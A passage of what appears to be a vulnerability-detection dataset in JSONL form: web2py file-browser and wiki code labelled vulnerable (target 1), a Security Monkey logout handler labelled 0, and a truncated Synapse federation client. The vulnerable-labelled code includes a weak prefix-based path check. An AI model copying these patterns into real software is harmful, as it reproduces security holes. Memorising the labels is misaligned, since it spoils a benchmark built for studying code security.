Storage()\n        return self.__dict__[key]\n\n    def keys(self):\n        return self.__dict__.keys()\n\n    def __contains__(self, key):\n        return key in self.__dict__\n\n\nclass Expose(object):\n    def __init__(self, base=None, basename=None, extensions=None, allow_download=True):\n        \"\"\"\n        Examples:\n            Use as::\n\n                def static():\n                    return dict(files=Expose())\n\n            or::\n\n                def static():\n                    path = os.path.join(request.folder,'static','public')\n                    return dict(files=Expose(path,basename='public'))\n\n        Args:\n            extensions: an optional list of file extensions for filtering\n                displayed files: e.g. `['.py', '.jpg']`\n            allow_download: whether to allow downloading selected files\n\n        \"\"\"\n        current.session.forget()\n        base = base or os.path.join(current.request.folder, 'static')\n        basename = basename or current.request.function\n        self.basename = basename\n\n        if current.request.raw_args:\n            self.args = [arg for arg in current.request.raw_args.split('/') if arg]\n        else:\n            self.args = [arg for arg in current.request.args if arg]\n        filename = os.path.join(base, *self.args)\n        if not os.path.exists(filename):\n            raise HTTP(404, \"FILE NOT FOUND\")\n        if not os.path.normpath(filename).startswith(base):\n            raise HTTP(401, \"NOT AUTHORIZED\")\n        if allow_download and not os.path.isdir(filename):\n            current.response.headers['Content-Type'] = contenttype(filename)\n            raise HTTP(200, open(filename, 'rb'), **current.response.headers)\n        self.path = path = os.path.join(filename, '*')\n        self.folders = [f[len(path) - 1:] for f in sorted(glob.glob(path))\n                            if os.path.isdir(f) and not self.isprivate(f)]\n        self.filenames = [f[len(path) - 1:] for f in sorted(glob.glob(path))\n                            if not os.path.isdir(f) and not self.isprivate(f)]\n        if 'README' in self.filenames:\n            readme = open(os.path.join(filename, 'README')).read()\n            self.paragraph = MARKMIN(readme)\n        else:\n            self.paragraph = None\n        if extensions:\n            self.filenames = [f for f in self.filenames\n                              if os.path.splitext(f)[-1] in extensions]\n\n    def breadcrumbs(self, basename):\n        path = []\n        span = SPAN()\n        span.append(A(basename, _href=URL()))\n        for arg in self.args:\n            span.append('/')\n            path.append(arg)\n            span.append(A(arg, _href=URL(args='/'.join(path))))\n        return span\n\n    def table_folders(self):\n        if self.folders:\n            return SPAN(H3('Folders'), TABLE(\n                    *[TR(TD(A(folder, _href=URL(args=self.args + [folder]))))\n                      for folder in self.folders],\n                     **dict(_class=\"table\")))\n        return ''\n\n    @staticmethod\n    def isprivate(f):\n        return 'private' in f or f.startswith('.') or f.endswith('~')\n\n    @staticmethod\n    def isimage(f):\n        return os.path.splitext(f)[-1].lower() in (\n            '.png', '.jpg', '.jpeg', '.gif', '.tiff')\n\n    def table_files(self, width=160):\n        if self.filenames:\n            return SPAN(H3('Files'),\n                        TABLE(*[TR(TD(A(f, _href=URL(args=self.args + [f]))),\n                                   TD(IMG(_src=URL(args=self.args + [f]),\n                                          _style='max-width:%spx' % width)\n                                      if width and self.isimage(f) else ''))\n                                for f in self.filenames],\n                               **dict(_class=\"table\")))\n        return ''\n\n    def xml(self):\n        return DIV(\n            H2(self.breadcrumbs(self.basename)),\n            self.paragraph or '',\n            self.table_folders(),\n            self.table_files()).xml()\n\n\nclass Wiki(object):\n    everybody = 'everybody'\n    rows_page = 25\n\n    def markmin_base(self, body):\n        return MARKMIN(body, extra=self.settings.extra,\n                       url=True, environment=self.env,\n                       autolinks=lambda link: expand_one(link, {})).xml()\n\n    def render_tags(self, tags):\n        return DIV(\n            _class='w2p_wiki_tags',\n            *[A(t.strip(), _href=URL(args='_search', vars=dict(q=t)))\n              for t in tags or [] if t.strip()])\n\n    def markmin_render(self, page):\n        return self.markmin_base(page.body) + self.render_tags(page.tags).xml()\n\n    def html_render(self, page):\n        html = page.body\n        # @///function -> http://..../function\n        html = replace_at_urls(html, URL)\n        # http://...jpg -> <img src=\"http://...jpg/> or embed\n        html = replace_autolinks(html, lambda link: expand_one(link, {}))\n        # @{component:name} -> <script>embed component name</script>\n        html = replace_components(html, self.env)\n        html = html + self.render_tags(page.tags).xml()\n        return html\n\n    @staticmethod\n    def component(text):\n        \"\"\"\n        In wiki docs allows `@{component:controller/function/args}`\n        which renders as a `LOAD(..., ajax=True)`\n        \"\"\"\n        items = text.split('/')\n        controller, function, args = items[0], items[1], items[2:]\n        return LOAD(controller, function, args=args, ajax=True).xml()\n\n    def get_renderer(self):\n        if isinstance(self.settings.render, basestring):\n            r = getattr(self, \"%s_render\" % self.settings.render)\n        elif callable(self.settings.render):\n            r = self.settings.render\n        elif isinstance(self.settings.render, dict):\n            def custom_render(page):\n                if page.render:\n                    if page.render in self.settings.render.keys():\n                        my_render = self.settings.render[page.render]\n                    else:\n                        my_render = getattr(self, \"%s_render\" % page.render)\n                else:\n                    my_render = self.markmin_render\n                return my_render(page)\n            r = custom_render\n        else:\n            raise ValueError(\n                \"Invalid render type %s\" % type(self.settings.render))\n        return r\n\n    def __init__(self, auth, env=None, render='markmin',\n                 manage_permissions=False, force_prefix='',\n                 restrict_search=False, extra=None,\n                 menu_groups=None, templates=None, migrate=True,\n                 controller=None, function=None, groups=None):\n\n        settings = self.settings = auth.settings.wiki\n\n        \"\"\"\n        Args:\n            render:\n\n                - \"markmin\"\n                - \"html\"\n                - `<function>` : Sets a custom render function\n                - `dict(html=<function>, markmin=...)`: dict(...) allows\n                   multiple custom render functions\n                - \"multiple\" : Is the same as `{}`. It enables per-record\n                   formats using builtins\n\n        \"\"\"\n        engines = set(['markmin', 'html'])\n        show_engine = False\n        if render == \"multiple\":\n            render = {}\n        if isinstance(render, dict):\n            [engines.add(key) for key in render]\n            show_engine = True\n        settings.render = render\n        perms = settings.manage_permissions = manage_permissions\n\n        settings.force_prefix = force_prefix\n        settings.restrict_search = restrict_search\n        settings.extra = extra or {}\n        settings.menu_groups = menu_groups\n        settings.templates = templates\n        settings.controller = controller\n        settings.function = function\n        settings.groups = auth.user_groups.values() \\\n            if groups is None else groups\n\n        db = auth.db\n        self.env = env or {}\n        self.env['component'] = Wiki.component\n        self.auth = auth\n        self.wiki_menu_items = None\n\n        if self.auth.user:\n            self.settings.force_prefix = force_prefix % self.auth.user\n        else:\n            self.settings.force_prefix = force_prefix\n\n        self.host = current.request.env.http_host\n\n        table_definitions = [\n            ('wiki_page', {\n                    'args': [\n                        Field('slug',\n                              requires=[IS_SLUG(),\n                                        IS_NOT_IN_DB(db, 'wiki_page.slug')],\n                              writable=False),\n                        Field('title', length=255, unique=True),\n                        Field('body', 'text', notnull=True),\n                        Field('tags', 'list:string'),\n                        Field('can_read', 'list:string',\n                              writable=perms,\n                              readable=perms,\n                              default=[Wiki.everybody]),\n                        Field('can_edit', 'list:string',\n                              writable=perms, readable=perms,\n                              default=[Wiki.everybody]),\n                        Field('changelog'),\n                        Field('html', 'text',\n                              compute=self.get_renderer(),\n                              readable=False, writable=False),\n                        Field('render', default=\"markmin\",\n                              readable=show_engine,\n                              writable=show_engine,\n                              requires=IS_EMPTY_OR(\n                                  IS_IN_SET(engines))),\n                        auth.signature],\n                    'vars': {'format': '%(title)s', 'migrate': migrate}}),\n            ('wiki_tag', {\n                    'args': [\n                        Field('name'),\n                        Field('wiki_page', 'reference wiki_page'),\n                        auth.signature],\n                    'vars':{'format': '%(title)s', 'migrate': migrate}}),\n            ('wiki_media', {\n                    'args': [\n                        Field('wiki_page', 'reference wiki_page'),\n                        Field('title', required=True),\n                        Field('filename', 'upload', required=True),\n                        auth.signature],\n                    'vars': {'format': '%(title)s', 'migrate': migrate}}),\n            ]\n\n        # define only non-existent tables\n        for key, value in table_definitions:\n            args = []\n            if not key in db.tables():\n                # look for wiki_ extra fields in auth.settings\n                extra_fields = auth.settings.extra_fields\n                if extra_fields:\n                    if key in extra_fields:\n                        if extra_fields[key]:\n                            for field in extra_fields[key]:\n                                args.append(field)\n                args += value['args']\n                db.define_table(key, *args, **value['vars'])\n\n        if self.settings.templates is None and not \\\n           self.settings.manage_permissions:\n            self.settings.templates = db.wiki_page.tags.contains('template') & \\\n                db.wiki_page.can_read.contains('everybody')\n\n        def update_tags_insert(page, id, db=db):\n            for tag in page.tags or []:\n                tag = tag.strip().lower()\n                if tag:\n                    db.wiki_tag.insert(name=tag, wiki_page=id)\n\n        def update_tags_update(dbset, page, db=db):\n            page = dbset.select(limitby=(0, 1)).first()\n            db(db.wiki_tag.wiki_page == page.id).delete()\n            for tag in page.tags or []:\n                tag = tag.strip().lower()\n                if tag:\n                    db.wiki_tag.insert(name=tag, wiki_page=page.id)\n        db.wiki_page._after_insert.append(update_tags_insert)\n        db.wiki_page._after_update.append(update_tags_update)\n\n        if (auth.user and\n            check_credentials(current.request, gae_login=False) and\n            not 'wiki_editor' in auth.user_groups.values() and\n            self.settings.groups == auth.user_groups.values()):\n            group = db.auth_group(role='wiki_editor')\n            gid = group.id if group else db.auth_group.insert(\n                role='wiki_editor')\n            auth.add_membership(gid)\n\n        settings.lock_keys = True\n\n    # WIKI ACCESS POLICY\n\n    def not_authorized(self, page=None):\n        raise HTTP(401)\n\n    def can_read(self, page):\n        if 'everybody' in page.can_read or not \\\n            self.settings.manage_permissions:\n            return True\n        elif self.auth.user:\n            groups = self.settings.groups\n            if ('wiki_editor' in groups or\n                set(groups).intersection(set(page.can_read + page.can_edit)) or\n                page.created_by == self.auth.user.id):\n                return True\n        return False\n\n    def can_edit(self, page=None):\n        if not self.auth.user:\n            redirect(self.auth.settings.login_url)\n        groups = self.settings.groups\n        return ('wiki_editor' in groups or\n                (page is None and 'wiki_author' in groups) or\n                not page is None and (\n                set(groups).intersection(set(page.can_edit)) or\n                page.created_by == self.auth.user.id))\n\n    def can_manage(self):\n        if not self.auth.user:\n            return False\n        groups = self.settings.groups\n        return 'wiki_editor' in groups\n\n    def can_search(self):\n        return True\n\n    def can_see_menu(self):\n        if self.auth.user:\n            if self.settings.menu_groups is None:\n                return True\n            else:\n                groups = self.settings.groups\n                if any(t in self.settings.menu_groups for t in groups):\n                    return True\n        return False\n\n    ### END POLICY\n\n    def automenu(self):\n        \"\"\"adds the menu if not present\"\"\"\n        if (not self.wiki_menu_items and\n            self.settings.controller and\n            self.settings.function):\n            self.wiki_menu_items = self.menu(self.settings.controller,\n                                             self.settings.function)\n            current.response.menu += self.wiki_menu_items\n\n    def __call__(self):\n        request = current.request\n        settings = self.settings\n        settings.controller = settings.controller or request.controller\n        settings.function = settings.function or request.function\n        self.automenu()\n\n        zero = request.args(0) or 'index'\n        if zero and zero.isdigit():\n            return self.media(int(zero))\n        elif not zero or not zero.startswith('_'):\n            return self.read(zero)\n        elif zero == '_edit':\n            return self.edit(request.args(1) or 'index', request.args(2) or 0)\n        elif zero == '_editmedia':\n            return self.editmedia(request.args(1) or 'index')\n        elif zero == '_create':\n            return self.create()\n        elif zero == '_pages':\n            return self.pages()\n        elif zero == '_search':\n            return self.search()\n        elif zero == '_recent':\n            ipage = int(request.vars.page or 0)\n            query = self.auth.db.wiki_page.created_by == request.args(\n                1, cast=int)\n            return self.search(query=query,\n                               orderby=~self.auth.db.wiki_page.created_on,\n                               limitby=(ipage * self.rows_page,\n                                        (ipage + 1) * self.rows_page),\n                               )\n        elif zero == '_cloud':\n            return self.cloud()\n        elif zero == '_preview':\n            return self.preview(self.get_renderer())\n\n    def first_paragraph(self, page):\n        if not self.can_read(page):\n            mm = (page.body or '').replace('\\r', '')\n            ps = [p for p in mm.split('\\n\\n')\n                      if not p.startswith('#') and p.strip()]\n            if ps:\n                return ps[0]\n        return ''\n\n    def fix_hostname(self, body):\n        return (body or '').replace('://HOSTNAME', '://%s' % self.host)\n\n    def read(self, slug, force_render=False):\n        if slug in '_cloud':\n            return self.cloud()\n        elif slug in '_search':\n            return self.search()\n        page = self.auth.db.wiki_page(slug=slug)\n        if page and (not self.can_read(page)):\n            return self.not_authorized(page)\n        if current.request.extension == 'html':\n            if not page:\n                url = URL(args=('_create', slug))\n                return dict(content=A('Create page \"%s\"' % slug, _href=url, _class=\"btn\"))\n            else:\n                html = page.html if not force_render else self.get_renderer()(page)\n                content = XML(self.fix_hostname(html))\n                return dict(title=page.title,\n                            slug=page.slug,\n                            page=page,\n                            content=content,\n                            tags=page.tags,\n                            created_on=page.created_on,\n                            modified_on=page.modified_on)\n        elif current.request.extension == 'load':\n            return self.fix_hostname(page.html) if page else ''\n        else:\n            if not page:\n                raise HTTP(404)\n            else:\n                return dict(title=page.title,\n                            slug=page.slug,\n                            page=page,\n                            content=page.body,\n                            tags=page.tags,\n                            created_on=page.created_on,\n                            modified_on=page.modified_on)\n\n    def edit(self, slug, from_template=0):\n        auth = self.auth\n        db = auth.db\n        page = db.wiki_page(slug=slug)\n        if not self.can_edit(page):\n            return self.not_authorized(page)\n        title_guess = ' '.join(c.capitalize() for c in slug.split('-'))\n        if not page:\n            if not (self.can_manage() or\n                    slug.startswith(self.settings.force_prefix)):\n                current.session.flash = 'slug must have \"%s\" prefix' \\\n                    % self.settings.force_prefix\n                redirect(URL(args=('_create')))\n            db.wiki_page.can_read.default = [Wiki.everybody]\n            db.wiki_page.can_edit.default = [auth.user_group_role()]\n            db.wiki_page.title.default = title_guess\n            db.wiki_page.slug.default = slug\n            if slug == 'wiki-menu':\n                db.wiki_page.body.default = \\\n                    '- Menu Item > @////index\\n- - Submenu > http://web2py.com'\n            else:\n                db.wiki_page.body.default = db(db.wiki_page.id == from_template).select(db.wiki_page.body)[0].body \\\n                    if int(from_template) > 0 else '## %s\\n\\npage content' % title_guess\n        vars = current.request.post_vars\n        if vars.body:\n            vars.body = vars.body.replace('://%s' % self.host, '://HOSTNAME')\n        form = SQLFORM(db.wiki_page, page, deletable=True,\n                       formstyle='table2cols', showid=False).process()\n        if form.deleted:\n            current.session.flash = 'page deleted'\n            redirect(URL())\n        elif form.accepted:\n            current.session.flash = 'page created'\n            redirect(URL(args=slug))\n        script = \"\"\"\n        jQuery(function() {\n            if (!jQuery('#wiki_page_body').length) return;\n            var pagecontent = jQuery('#wiki_page_body');\n            pagecontent.css('font-family',\n                            'Monaco,Menlo,Consolas,\"Courier New\",monospace');\n            var prevbutton = jQuery('<button class=\"btn nopreview\">Preview</button>');\n            var preview = jQuery('<div id=\"preview\"></div>').hide();\n            var previewmedia = jQuery('<div id=\"previewmedia\"></div>');\n            var form = pagecontent.closest('form');\n            preview.insertBefore(form);\n            prevbutton.insertBefore(form);\n            if(%(link_media)s) {\n              var mediabutton = jQuery('<button class=\"btn nopreview\">Media</button>');\n              mediabutton.insertBefore(form);\n              previewmedia.insertBefore(form);\n              mediabutton.click(function() {\n                if (mediabutton.hasClass('nopreview')) {\n                    web2py_component('%(urlmedia)s', 'previewmedia');\n                } else {\n                    previewmedia.empty();\n                }\n                mediabutton.toggleClass('nopreview');\n              });\n            }\n            prevbutton.click(function(e) {\n                e.preventDefault();\n                if (prevbutton.hasClass('nopreview')) {\n                    prevbutton.addClass('preview').removeClass(\n                        'nopreview').html('Edit Source');\n                    try{var wiki_render = jQuery('#wiki_page_render').val()}\n                    catch(e){var wiki_render = null;}\n                    web2py_ajax_page('post', \\\n                        '%(url)s', {body: jQuery('#wiki_page_body').val(), \\\n                                    render: wiki_render}, 'preview');\n                    form.fadeOut('fast', function() {preview.fadeIn()});\n                } else {\n                    prevbutton.addClass(\n                        'nopreview').removeClass('preview').html('Preview');\n                    preview.fadeOut('fast', function() {form.fadeIn()});\n                }\n            })\n        })\n        \"\"\" % dict(url=URL(args=('_preview', slug)), link_media=('true' if page else 'false'),\n                   urlmedia=URL(extension='load',\n                                args=('_editmedia', slug),\n                                vars=dict(embedded=1)))\n        return dict(content=TAG[''](form, SCRIPT(script)))\n\n    def editmedia(self, slug):\n        auth = self.auth\n        db = auth.db\n        page = db.wiki_page(slug=slug)\n        if not (page and self.can_edit(page)):\n            return self.not_authorized(page)\n        self.auth.db.wiki_media.id.represent = lambda id, row: \\\n            id if not row.filename else \\\n            SPAN('@////%i/%s.%s' % (id, IS_SLUG.urlify(row.title.split('.')[0]), row.filename.split('.')[-1]))\n        self.auth.db.wiki_media.wiki_page.default = page.id\n        self.auth.db.wiki_media.wiki_page.writable = False\n        links = []\n        csv = True\n        create = True\n        if current.request.vars.embedded:\n            script = \"var c = jQuery('#wiki_page_body'); c.val(c.val() + jQuery('%s').text()); return false;\"\n            fragment = self.auth.db.wiki_media.id.represent\n            csv = False\n            create = False\n            links= [\n                lambda row:\n                    A('copy into source', _href='#', _onclick=script % (fragment(row.id, row)))\n                    ]\n        content = SQLFORM.grid(\n            self.auth.db.wiki_media.wiki_page == page.id,\n            orderby=self.auth.db.wiki_media.title,\n            links=links,\n            csv=csv,\n            create=create,\n            args=['_editmedia', slug],\n            user_signature=False)\n        return dict(content=content)\n\n    def create(self):\n        if not self.can_edit():\n            return self.not_authorized()\n        db = self.auth.db\n        slugs = db(db.wiki_page.id > 0).select(db.wiki_page.id, db.wiki_page.slug)\n        options = [OPTION(row.slug, _value=row.id) for row in slugs]\n        options.insert(0, OPTION('', _value=''))\n        fields = [Field(\"slug\", default=current.request.args(1) or\n                        self.settings.force_prefix,\n                        requires=(IS_SLUG(), IS_NOT_IN_DB(db, db.wiki_page.slug))),]\n        if self.settings.templates:\n            fields.append(\n                Field(\"from_template\", \"reference wiki_page\",\n                      requires=IS_EMPTY_OR(\n                                   IS_IN_DB(db(self.settings.templates),\n                                            db.wiki_page._id,\n                                            '%(slug)s')),\n                      comment=current.T(\n                        \"Choose Template or empty for new Page\")))\n        form = SQLFORM.factory(*fields, **dict(_class=\"well\"))\n        form.element(\"[type=submit]\").attributes[\"_value\"] = \\\n            current.T(\"Create Page from Slug\")\n\n        if form.process().accepted:\n             form.vars.from_template = 0 if not form.vars.from_template \\\n                 else form.vars.from_template\n             redirect(URL(args=('_edit', form.vars.slug, form.vars.from_template or 0)))  # added param\n        return dict(content=form)\n\n    def pages(self):\n        if not self.can_manage():\n            return self.not_authorized()\n        self.auth.db.wiki_page.slug.represent = lambda slug, row: SPAN(\n            '@////%s' % slug)\n        self.auth.db.wiki_page.title.represent = lambda title, row: \\\n            A(title, _href=URL(args=row.slug))\n        wiki_table = self.auth.db.wiki_page\n        content = SQLFORM.grid(\n            wiki_table,\n            fields=[wiki_table.slug,\n                    wiki_table.title, wiki_table.tags,\n                    wiki_table.can_read, wiki_table.can_edit],\n            links=[\n                lambda row:\n                    A('edit', _href=URL(args=('_edit', row.slug)), _class='btn'),\n                lambda row:\n                    A('media', _href=URL(args=('_editmedia', row.slug)), _class='btn')],\n            details=False, editable=False, deletable=False, create=False,\n            orderby=self.auth.db.wiki_page.title,\n            args=['_pages'],\n            user_signature=False)\n\n        return dict(content=content)\n\n    def media(self, id):\n        request, response, db = current.request, current.response, self.auth.db\n        media = db.wiki_media(id)\n        if media:\n            if self.settings.manage_permissions:\n                page = db.wiki_page(media.wiki_page)\n                if not self.can_read(page):\n                    return self.not_authorized(page)\n            request.args = [media.filename]\n            m = response.download(request, db)\n            current.session.forget()  # get rid of the cookie\n            response.headers['Last-Modified'] = \\\n                request.utcnow.strftime(\"%a, %d %b %Y %H:%M:%S GMT\")\n            if 'Content-Disposition' in response.headers:\n                del response.headers['Content-Disposition']\n            response.headers['Pragma'] = 'cache'\n            response.headers['Cache-Control'] = 'private'\n            return m\n        else:\n            raise HTTP(404)\n\n    def menu(self, controller='default', function='index'):\n        db = self.auth.db\n        request = current.request\n        menu_page = db.wiki_page(slug='wiki-menu')\n        menu = []\n        if menu_page:\n            tree = {'': menu}\n            regex = re.compile('[\\r\\n\\t]*(?P<base>(\\s*\\-\\s*)+)(?P<title>\\w.*?)\\s+\\>\\s+(?P<link>\\S+)')\n            for match in regex.finditer(self.fix_hostname(menu_page.body)):\n                base = match.group('base').replace(' ', '')\n                title = match.group('title')\n                link = match.group('link')\n                title_page = None\n                if link.startswith('@'):\n                    items = link[2:].split('/')\n                    if len(items) > 3:\n                        title_page = items[3]\n                        link = URL(a=items[0] or None, c=items[1] or controller,\n                                   f=items[2] or function, args=items[3:])\n                parent = tree.get(base[1:], tree[''])\n                subtree = []\n                tree[base] = subtree\n                parent.append((current.T(title),\n                               request.args(0) == title_page,\n                               link, subtree))\n        if self.can_see_menu():\n            submenu = []\n            menu.append((current.T('[Wiki]'), None, None, submenu))\n            if URL() == URL(controller, function):\n                if not str(request.args(0)).startswith('_'):\n                    slug = request.args(0) or 'index'\n                    mode = 1\n                elif request.args(0) == '_edit':\n                    slug = request.args(1) or 'index'\n                    mode = 2\n                elif request.args(0) == '_editmedia':\n                    slug = request.args(1) or 'index'\n                    mode = 3\n                else:\n                    mode = 0\n                if mode in (2, 3):\n                    submenu.append((current.T('View Page'), None,\n                    URL(controller, function, args=slug)))\n                if mode in (1, 3):\n                    submenu.append((current.T('Edit Page'), None,\n                    URL(controller, function, args=('_edit', slug))))\n                if mode in (1, 2):\n                    submenu.append((current.T('Edit Page Media'), None,\n                    URL(controller, function, args=('_editmedia', slug))))\n\n            submenu.append((current.T('Create New Page'), None,\n                            URL(controller, function, args=('_create'))))\n            # Moved next if to inside self.auth.user check\n            if self.can_manage():\n                submenu.append((current.T('Manage Pages'), None,\n                            URL(controller, function, args=('_pages'))))\n                submenu.append((current.T('Edit Menu'), None,\n                            URL(controller, function, args=('_edit', 'wiki-menu'))))\n            # Also moved inside self.auth.user check\n            submenu.append((current.T('Search Pages'), None,\n                        URL(controller, function, args=('_search'))))\n        return menu\n\n    def search(self, tags=None, query=None, cloud=True, preview=True,\n               limitby=(0, 100), orderby=None):\n        if not self.can_search():\n            return self.not_authorized()\n        request = current.request\n        content = CAT()\n        if tags is None and query is None:\n            form = FORM(INPUT(_name='q', requires=IS_NOT_EMPTY(),\n                              value=request.vars.q),\n                        INPUT(_type=\"submit\", _value=current.T('Search')),\n                        _method='GET')\n            content.append(DIV(form, _class='w2p_wiki_form'))\n            if request.vars.q:\n                tags = [v.strip() for v in request.vars.q.split(',')]\n                tags = [v.lower() for v in tags if v]\n        if tags or not query is None:\n            db = self.auth.db\n            count = db.wiki_tag.wiki_page.count()\n            fields = [db.wiki_page.id, db.wiki_page.slug,\n                      db.wiki_page.title, db.wiki_page.tags,\n                      db.wiki_page.can_read]\n            if preview:\n                fields.append(db.wiki_page.body)\n            if query is None:\n                query = (db.wiki_page.id == db.wiki_tag.wiki_page) &\\\n                    (db.wiki_tag.name.belongs(tags))\n                query = query | db.wiki_page.title.contains(request.vars.q)\n            if self.settings.restrict_search and not self.manage():\n                query = query & (db.wiki_page.created_by == self.auth.user_id)\n            pages = db(query).select(count,\n                                     *fields, **dict(orderby=orderby or ~count,\n                                                     groupby=reduce(lambda a, b: a | b, fields),\n                                                     distinct=True,\n                                                     limitby=limitby))\n            if request.extension in ('html', 'load'):\n                if not pages:\n                    content.append(DIV(current.T(\"No results\"),\n                                       _class='w2p_wiki_form'))\n\n                def link(t):\n                    return A(t, _href=URL(args='_search', vars=dict(q=t)))\n                items = [DIV(H3(A(p.wiki_page.title, _href=URL(\n                                    args=p.wiki_page.slug))),\n                             MARKMIN(self.first_paragraph(p.wiki_page))\n                                 if preview else '',\n                             DIV(_class='w2p_wiki_tags',\n                                 *[link(t.strip()) for t in\n                                       p.wiki_page.tags or [] if t.strip()]),\n                             _class='w2p_wiki_search_item')\n                         for p in pages]\n                content.append(DIV(_class='w2p_wiki_pages', *items))\n            else:\n                cloud = False\n                content = [p.wiki_page.as_dict() for p in pages]\n        elif cloud:\n            content.append(self.cloud()['content'])\n        if request.extension == 'load':\n            return content\n        return dict(content=content)\n\n    def cloud(self):\n        db = self.auth.db\n        count = db.wiki_tag.wiki_page.count(distinct=True)\n        ids = db(db.wiki_tag).select(\n            db.wiki_tag.name, count,\n            distinct=True,\n            groupby=db.wiki_tag.name,\n            orderby=~count, limitby=(0, 20))\n        if ids:\n            a, b = ids[0](count), ids[-1](count)\n\n        def style(c):\n            STYLE = 'padding:0 0.2em;line-height:%.2fem;font-size:%.2fem'\n            size = (1.5 * (c - b) / max(a - b, 1) + 1.3)\n            return STYLE % (1.3, size)\n        items = []\n        for item in ids:\n            items.append(A(item.wiki_tag.name,\n                           _style=style(item(count)),\n                           _href=URL(args='_search',\n                                     vars=dict(q=item.wiki_tag.name))))\n            items.append(' ')\n        return dict(content=DIV(_class='w2p_cloud', *items))\n\n    def preview(self, render):\n        request = current.request\n        # FIXME: This is an ugly hack to ensure a default render\n        # engine if not specified (with multiple render engines)\n        if not \"render\" in request.post_vars:\n            request.post_vars.render = None\n        return render(request.post_vars)\n\n\nclass Config(object):\n    def __init__(\n        self,\n        filename,\n        section,\n        default_values={}\n    ):\n        self.config = ConfigParser.ConfigParser(default_values)\n        self.config.read(filename)\n        if not self.config.has_section(section):\n            self.config.add_section(section)\n        self.section  = section\n        self.filename = filename\n\n    def read(self):\n        if not(isinstance(current.session['settings_%s' % self.section], dict)):\n            settings = dict(self.config.items(self.section))\n        else:\n            settings = current.session['settings_%s' % self.section]\n        return settings\n\n    def save(self, options):\n        for option, value in options:\n            self.config.set(self.section, option, value)\n        try:\n            self.config.write(open(self.filename, 'w'))\n            result = True\n        except:\n            current.session['settings_%s' % self.section] = dict(self.config.items(self.section))\n            result = False\n        return result\n\nif __name__ == '__main__':\n    import doctest\n    doctest.testmod()\n", "target": 1}
{"idx": 1073, "func": "#     Copyright 2014 Netflix, Inc.\n#\n#     Licensed under the Apache License, Version 2.0 (the \"License\");\n#     you may not use this file except in compliance with the License.\n#     You may obtain a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#     Unless required by applicable law or agreed to in writing, software\n#     distributed under the License is distributed on an \"AS IS\" BASIS,\n#     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n#     See the License for the specific language governing permissions and\n#     limitations under the License.\n\nfrom flask_login import current_user, logout_user\nfrom flask_restful import Resource\n\n\n# End the Flask-Logins session\nfrom security_monkey import rbac\n\n\nclass Logout(Resource):\n\n    decorators = [rbac.exempt]\n\n    def get(self):\n        if not current_user.is_authenticated:\n            return \"Must be logged in to log out\", 200\n\n        logout_user()\n        return \"Logged Out\", 200\n", "target": 0}
{"idx": 1074, "func": "# -*- coding: utf-8 -*-\n# Copyright 2014-2016 OpenMarket Ltd\n# Copyright 2018 New Vector Ltd\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport logging\nimport urllib\nfrom typing import Any, Dict, Optional\n\nfrom synapse.api.constants import Membership\nfrom synapse.api.errors import Codes, HttpResponseException, SynapseError\nfrom synapse.api.urls import (\n    FEDERATION_UNSTABLE_PREFIX,\n    FEDERATION_V1_PREFIX,\n    FEDERATION_V2_PREFIX,\n)\nfrom synapse.logging.utils import log_function\n\nlogger = logging.getLogger(__name__)\n\n\nclass TransportLayerClient:\n    \"\"\"Sends federation HTTP requests to other servers\"\"\"\n\n    def __init__(self, hs):\n        self.server_name = hs.hostname\n        self.client = hs.get_http_client()\n\n    @log_function\n    def get_room_state_ids(self, destination, room_id, event_id):\n        \"\"\" Requests all state for a given room from the given server at the\n        given event. Returns the state's event_id's\n\n        Args:\n            destination (str): The host name of the remote homeserver we want\n                to get the state from.\n            context (str): The name of the context we want the state of\n            event_id (str): The event we want the context at.\n\n        Returns:\n            Awaitable: Results in a dict received from the remote homeserver.\n        \"\"\"\n        logger.debug(\"get_room_state_ids dest=%s, room=%s\", destination, room_id)\n\n        path = _create_v1_path(\"/state_ids/%s\", room_id)\n        return self.client.get_json(\n            destination,\n            path=path,\n            args={\"event_id\": event_id},\n            try_trailing_slash_on_400=True,\n        )\n\n    @log_function\n    def get_event(self, destination, event_id, timeout=None):\n        \"\"\" Requests the pdu with give id and origin from the given server.\n\n        Args:\n            destination (str): The host name of the remote homeserver we want\n                to get the state from.\n            event_id (str): The id of the event being requested.\n            timeout (int): How long to try (in ms) the destination for before\n                giving up. None indicates no timeout.\n\n        Returns:\n            Awaitable: Results in a dict received from the remote homeserver.\n        \"\"\"\n        logger.debug(\"get_pdu dest=%s, event_id=%s\", destination, event_id)\n\n        path = _create_v1_path(\"/event/%s\", event_id)\n        return self.client.get_json(\n            destination, path=path, timeout=timeout, try_trailing_slash_on_400=True\n        )\n\n    @log_function\n    def backfill(self, destination, room_id, event_tuples, limit):\n        \"\"\" Requests `limit` previous PDUs in a given context before list of\n        PDUs.\n\n        Args:\n            dest (str)\n            room_id (str)\n            event_tuples (list)\n            limit (int)\n\n        Returns:\n            Awaitable: Results in a dict received from the remote homeserver.\n        \"\"\"\n        logger.debug(\n            \"backfill dest=%s, room_id=%s, event_tuples=%r, limit=%s\",\n            destination,\n            room_id,\n            event_tuples,\n            str(limit),\n        )\n\n        if not event_tuples:\n            # TODO: raise?\n            return\n\n        path = _create_v1_path(\"/backfill/%s\", room_id)\n\n        args = {\"v\": event_tuples, \"limit\": [str(limit)]}\n\n        return self.client.get_json(\n            destination, path=path, args=args, try_trailing_slash_on_400=True\n        )\n\n    @log_function\n    async def send_transaction(self, transaction, json_data_callback=None):\n        \"\"\" Sends the given Transaction to its destination\n\n        Args:\n            transaction (Transaction)\n\n        Returns:\n            Succeeds when we get a 2xx HTTP response. The result\n            will be the decoded JSON body.\n\n            Fails with ``HTTPRequestException`` if we get an HTTP response\n            code >= 300.\n\n            Fails with ``NotRetryingDestination`` if we are not yet ready\n            to retry this server.\n\n            Fails with ``FederationDeniedError`` if this destination\n            is not on our federation whitelist\n        \"\"\"\n        logger.debug(\n            \"send_data dest=%s, txid=%s\",\n            transaction.destination,\n            transaction.transaction_id,\n        )\n\n        if transaction.destination == self.server_name:\n            raise RuntimeError(\"Transport layer cannot send to 